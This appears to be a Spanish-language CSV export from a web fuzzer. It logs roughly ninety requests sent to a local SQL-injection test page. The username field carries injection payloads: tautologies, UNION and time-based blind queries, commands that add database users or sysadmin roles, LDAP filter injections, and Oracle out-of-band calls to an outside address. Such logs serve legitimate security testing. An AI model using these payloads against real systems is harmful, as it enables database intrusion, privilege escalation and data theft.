Identificación de pestaña,Tipo de mensaje,Petición (Tiempo),Método,URL,Código,Razón,RTT,Tamaño de la Cabecera de Pregunta,Tamaño Cuerpo de Petición,Tamaño de la Cabecera de Respuesta,Respuesta (Tamaño del cuerpo),Alerta mayor,Estado,Cargas Útiles
16,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=insert%20into%20mysql.user%20(user,%20host,%20password)%20values%20('name',%20'localhost',%20password('pass123'))&password=prueba",200,OK,11,563,0,227,493,,,"[insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123'))]"
17,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=grant%20connect%20to%20name;%20grant%20resource%20to%20name;&password=prueba,200,OK,16,510,0,227,345,,,[grant connect to name; grant resource to name;]
18,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=insert%20into%20users(login,%20password,%20level)%20values(%20char(0x70)%20+%20char(0x65)%20+%20char(0x74)%20+%20char(0x65)%20+%20char(0x72)%20+%20char(0x70)%20+%20char(0x65)%20+%20char(0x74)%20+%20char(0x65)%20+%20char(0x72),char(0x64)&password=prueba",200,OK,16,686,0,227,345,,,"[insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)]"
19,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=%7C&password=prueba,200,OK,19,453,0,227,345,,,[|]
20,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=!&password=prueba,200,OK,7,451,0,227,345,,Reflejado,[!]
15,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=exec%20sp_addsrvrolemember%20'name'%20,%20'sysadmin'&password=prueba",200,OK,21,502,0,227,471,,,"[exec sp_addsrvrolemember 'name' , 'sysadmin']"
21,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=(&password=prueba,200,OK,6,451,0,227,345,,,[(]
23,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=&&password=prueba,200,OK,11,451,0,227,345,,,[&]
22,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=)&password=prueba,200,OK,13,451,0,227,345,,,[)]
24,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=!&password=prueba,200,OK,17,451,0,227,345,,Reflejado,[!]
25,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=%7C&password=prueba,200,OK,15,453,0,227,345,,,[|]
26,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=*%7C&password=prueba,200,OK,16,454,0,227,345,,,[*|]
29,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=*()%7C&'&password=prueba,200,OK,10,458,0,227,345,,,[*()|&']
27,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=*(%7C(mail=*))&password=prueba,200,OK,33,464,0,227,345,,,[*(|(mail=*))]
31,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=admin*)((%7Cuserpassword=*)&password=prueba,200,OK,14,477,0,227,345,,,[admin*)((|userpassword=*)]
30,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=admin*&password=prueba,200,OK,18,456,0,227,345,,,[admin*]
28,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=*(%7C(objectclass=*))&password=prueba,200,OK,14,471,0,227,345,,,[*(|(objectclass=*))]
32,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=*)(uid=*))(%7C(uid=*&password=prueba,200,OK,9,470,0,227,345,,,[*)(uid=*))(|(uid=*]
33,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=a&password=prueba,200,OK,11,451,0,227,345,,Reflejado,[a]
35,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20union%20(select%20@@version)%20--&password=prueba,200,OK,7,487,0,227,455,,,[' union (select @@version) --]
36,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20union%20(select%20NULL,%20(select%20@@version))%20--&password=prueba",200,OK,7,506,0,227,455,,,"[' union (select NULL, (select @@version)) --]"
34,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%201=1%20--&password=prueba,200,OK,13,467,0,227,437,,,[' or 1=1 --]
38,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20union%20(select%20NULL,%20NULL,%20NULL,%20%20(select%20@@version))%20--&password=prueba",200,OK,14,525,0,227,455,,,"[' union (select NULL, NULL, NULL,  (select @@version)) --]"
37,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20union%20(select%20NULL,%20NULL,%20(select%20@@version))%20--&password=prueba",200,OK,23,514,0,227,455,,,"[' union (select NULL, NULL, (select @@version)) --]"
40,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20union%20(select%20NULL,%20NULL,%20NULL,%20NULL,%20%20NULL,%20(select%20@@version))%20--&password=prueba",200,OK,16,541,0,227,455,,,"[' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --]"
39,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20union%20(select%20NULL,%20NULL,%20NULL,%20NULL,%20%20(select%20@@version))%20--&password=prueba",200,OK,28,533,0,227,455,,,"[' union (select NULL, NULL, NULL, NULL,  (select @@version)) --]"
42,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%201=1%20--&password=prueba,200,OK,20,467,0,227,437,,,[' or 1=1 --]
41,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=a&password=prueba,200,OK,16,451,0,227,345,,Reflejado,[a]
43,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20union%20(select%20@@version)%20--&password=prueba,200,OK,8,487,0,227,455,,,[' union (select @@version) --]
44,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20union%20(select%20NULL,%20(select%20@@version))%20--&password=prueba",200,OK,17,506,0,227,455,,,"[' union (select NULL, (select @@version)) --]"
47,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20union%20(select%20NULL,%20NULL,%20NULL,%20NULL,%20%20(select%20@@version))%20--&password=prueba",200,OK,7,533,0,227,455,,,"[' union (select NULL, NULL, NULL, NULL,  (select @@version)) --]"
46,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20union%20(select%20NULL,%20NULL,%20NULL,%20%20(select%20@@version))%20--&password=prueba",200,OK,14,525,0,227,455,,,"[' union (select NULL, NULL, NULL,  (select @@version)) --]"
45,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20union%20(select%20NULL,%20NULL,%20(select%20@@version))%20--&password=prueba",200,OK,10,514,0,227,455,,,"[' union (select NULL, NULL, (select @@version)) --]"
49,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=a&password=prueba,200,OK,21,451,0,227,345,,Reflejado,[a]
51,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=';%20if%20not(substring((select%20@@version),25,1)%20%3C%3E%205)%20waitfor%20delay%20'0:0:2'%20--&password=prueba",200,OK,13,547,0,227,516,,,"['; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --]"
50,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=';%20if%20not(substring((select%20@@version),25,1)%20%3C%3E%200)%20waitfor%20delay%20'0:0:2'%20--&password=prueba",200,OK,14,547,0,227,516,,,"['; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --]"
52,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=';%20if%20not(substring((select%20@@version),25,1)%20%3C%3E%208)%20waitfor%20delay%20'0:0:2'%20--&password=prueba",200,OK,5,547,0,227,516,,,"['; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --]"
53,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=';%20if%20not(substring((select%20@@version),24,1)%20%3C%3E%201)%20waitfor%20delay%20'0:0:2'%20--&password=prueba",200,OK,17,547,0,227,516,,,"['; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --]"
48,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20union%20(select%20NULL,%20NULL,%20NULL,%20NULL,%20%20NULL,%20(select%20@@version))%20--&password=prueba",200,OK,30,541,0,227,455,,,"[' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --]"
54,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=';%20if%20not(select%20system_user)%20%3C%3E%20'sa'%20waitfor%20delay%20'0:0:2'%20--&password=prueba,200,OK,11,534,0,227,516,,,['; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --]
56,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=';%20if%20not((select%20serverproperty('isintegratedsecurityonly'))%20%3C%3E%201)%20waitfor%20delay%20'0:0:2'%20--&password=prueba,200,OK,12,564,0,227,516,,,['; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --]
55,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=';%20if%20is_srvrolemember('sysadmin')%20%3E%200%20waitfor%20delay%20'0:0:2'%20--%20&password=prueba,200,OK,21,534,0,227,513,,,['; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- ]
57,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=';%20if%20not((select%20serverproperty('isintegratedsecurityonly'))%20%3C%3E%200)%20waitfor%20delay%20'0:0:2'%20--&password=prueba,200,OK,12,564,0,227,516,,,['; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --]
59,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=';%20if%20not(substring((select%20@@version),25,1)%20%3C%3E%200)%20waitfor%20delay%20'0:0:2'%20--&password=prueba",200,OK,11,547,0,227,516,,,"['; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --]"
61,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=';%20if%20not(substring((select%20@@version),25,1)%20%3C%3E%208)%20waitfor%20delay%20'0:0:2'%20--&password=prueba",200,OK,16,547,0,227,516,,,"['; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --]"
58,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=a&password=prueba,200,OK,14,451,0,227,345,,Reflejado,[a]
60,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=';%20if%20not(substring((select%20@@version),25,1)%20%3C%3E%205)%20waitfor%20delay%20'0:0:2'%20--&password=prueba",200,OK,10,547,0,227,516,,,"['; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --]"
62,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=';%20if%20not(substring((select%20@@version),24,1)%20%3C%3E%201)%20waitfor%20delay%20'0:0:2'%20--&password=prueba",200,OK,9,547,0,227,516,,,"['; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --]"
63,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=';%20if%20not(select%20system_user)%20%3C%3E%20'sa'%20waitfor%20delay%20'0:0:2'%20--&password=prueba,200,OK,11,534,0,227,516,,,['; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --]
64,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=';%20if%20is_srvrolemember('sysadmin')%20%3E%200%20waitfor%20delay%20'0:0:2'%20--%20&password=prueba,200,OK,9,534,0,227,513,,,['; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- ]
68,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1'1&password=prueba,200,OK,5,453,0,227,454,,,[1'1]
65,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=';%20if%20not((select%20serverproperty('isintegratedsecurityonly'))%20%3C%3E%201)%20waitfor%20delay%20'0:0:2'%20--&password=prueba,200,OK,18,564,0,227,516,,,['; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --]
67,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1&password=prueba,200,OK,23,451,0,227,345,,,[1]
66,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=';%20if%20not((select%20serverproperty('isintegratedsecurityonly'))%20%3C%3E%200)%20waitfor%20delay%20'0:0:2'%20--&password=prueba,200,OK,21,564,0,227,516,,,['; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --]
70,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1%20and%201=1&password=prueba,200,OK,9,463,0,227,345,,,[1 and 1=1]
69,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1%20exec%20sp_%20(or%20exec%20xp_)&password=prueba,200,OK,11,484,0,227,345,,,[1 exec sp_ (or exec xp_)]
71,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1'%20and%201=(select%20count(*)%20from%20tablenames);%20--&password=prueba,200,OK,12,508,0,227,455,,,[1' and 1=(select count(*) from tablenames); --]
73,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1'1&password=prueba,200,OK,10,453,0,227,454,,,[1'1]
72,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1&password=prueba,200,OK,13,451,0,227,345,,,[1]
74,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1%20exec%20sp_%20(or%20exec%20xp_)&password=prueba,200,OK,18,484,0,227,345,,,[1 exec sp_ (or exec xp_)]
76,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1'%20and%201=(select%20count(*)%20from%20tablenames);%20--&password=prueba,200,OK,9,508,0,227,455,,,[1' and 1=(select count(*) from tablenames); --]
79,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1'%20or%20'1'='1&password=prueba,200,OK,6,466,0,227,345,,,[1' or '1'='1]
75,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1%20and%201=1&password=prueba,200,OK,9,463,0,227,345,,,[1 and 1=1]
77,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=a&password=prueba,200,OK,24,451,0,227,345,,Reflejado,[a]
78,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1%20or%201=1&password=prueba,200,OK,15,462,0,227,345,,,[1 or 1=1]
80,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1%20and%20user_name()%20=%20'dbo'&password=prueba,200,OK,14,483,0,227,457,,,[1 and user_name() = 'dbo']
82,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1%20or%201=1&password=prueba,200,OK,9,462,0,227,345,,,[1 or 1=1]
81,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=a&password=prueba,200,OK,19,451,0,227,345,,Reflejado,[a]
84,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1%20and%20user_name()%20=%20'dbo'&password=prueba,200,OK,13,483,0,227,457,,,[1 and user_name() = 'dbo']
85,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1&password=prueba,200,OK,9,451,0,227,345,,,[1]
83,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1'%20or%20'1'='1&password=prueba,200,OK,14,466,0,227,345,,,[1' or '1'='1]
86,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1%20and%20user_name()%20=%20'dbo'&password=prueba,200,OK,8,483,0,227,457,,,[1 and user_name() = 'dbo']
90,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20username%20is%20not%20NULL%20or%20username%20=%20'&password=prueba,200,OK,3,509,0,227,327,,,[' or username is not NULL or username = ']
87,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=%5C';%20desc%20users;%20--&password=prueba,200,OK,8,476,0,227,345,,,[\'; desc users; --]
89,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1'%20and%20non_existant_table%20=%20'1&password=prueba,200,OK,5,488,0,227,328,,,[1' and non_existant_table = '1]
88,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1%5C'1&password=prueba,200,OK,9,456,0,227,345,,,[1\'1]
92,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=1%20union%20all%20select%201,2,3,4,5,6,name%20from%20sysobjects%20where%20xtype%20=%20'u'%20--&password=prueba",200,OK,6,544,0,227,458,,,"[1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --]"
91,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=1%20and%20ascii(lower(substring((select%20top%201%20name%20from%20sysobjects%20where%20xtype='u'),%201,%201)))%20%3E%20116&password=prueba",200,OK,4,572,0,227,474,,,"[1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116]"
95,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1%20and%20user_name()%20=%20'dbo'&password=prueba,200,OK,17,483,0,227,457,,,[1 and user_name() = 'dbo']
93,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1%20uni/**/on%20select%20all%20from%20where&password=prueba,200,OK,16,493,0,227,345,,,[1 uni/**/on select all from where]
94,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1&password=prueba,200,OK,12,451,0,227,345,,,[1]
96,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=%5C';%20desc%20users;%20--&password=prueba,200,OK,9,476,0,227,345,,,[\'; desc users; --]
99,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20username%20is%20not%20NULL%20or%20username%20=%20'&password=prueba,200,OK,9,509,0,227,327,,,[' or username is not NULL or username = ']
97,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1%5C'1&password=prueba,200,OK,15,456,0,227,345,,,[1\'1]
100,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=1%20and%20ascii(lower(substring((select%20top%201%20name%20from%20sysobjects%20where%20xtype='u'),%201,%201)))%20%3E%20116&password=prueba",200,OK,17,572,0,227,474,,,"[1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116]"
98,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1'%20and%20non_existant_table%20=%20'1&password=prueba,200,OK,17,488,0,227,328,,,[1' and non_existant_table = '1]
101,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=1%20union%20all%20select%201,2,3,4,5,6,name%20from%20sysobjects%20where%20xtype%20=%20'u'%20--&password=prueba",200,OK,15,544,0,227,458,,,"[1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --]"
102,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=1%20uni/**/on%20select%20all%20from%20where&password=prueba,200,OK,11,493,0,227,345,,,[1 uni/**/on select all from where]
104,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'1'='1&password=prueba,200,OK,14,465,0,227,345,,,[' or '1'='1]
106,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20%7C%7C%20myappadmin.adduser('admin',%20'newpass')%20%7C%7C%20'&password=prueba",200,OK,11,516,0,227,364,,,"[' || myappadmin.adduser('admin', 'newpass') || ']"
103,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=%20or%201=1&password=prueba,200,OK,10,461,0,227,345,,,[ or 1=1]
107,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20banner%20FROM%20v$version%20WHERE%20ROWNUM=1))%20AND%20'i'='i&password=prueba,200,OK,13,561,0,227,323,,,[' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i]
105,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%7C%7Cutl_http.request('httP://192.168.1.1/')%7C%7C'&password=prueba,200,OK,22,503,0,227,362,,,['||utl_http.request('httP://192.168.1.1/')||']
